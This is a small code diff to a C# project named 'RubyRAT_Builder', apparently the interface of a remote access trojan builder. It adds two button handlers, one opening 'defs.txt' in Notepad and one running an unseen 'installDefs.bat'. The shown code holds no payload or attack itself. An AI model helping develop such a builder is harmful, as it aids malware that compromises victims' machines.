@@ -186,10 +186,25 @@ namespace RubyRAT_Builder
 
         }
 
+
         // ------------------------------------------------------------------------- //
         //
         //                          Check Boxes
         //
         // ------------------------------------------------------------------------- //
+
+
+
+
+        private void btnSeeDef_Click(object sender, EventArgs e)
+        {
+            RunCommand("notepad defs.txt");
+        }
+
+        private void btnInstallDef_Click(object sender, EventArgs e)
+        {
+            RunCommand("installDefs.bat");
+        }
+
     }
 }
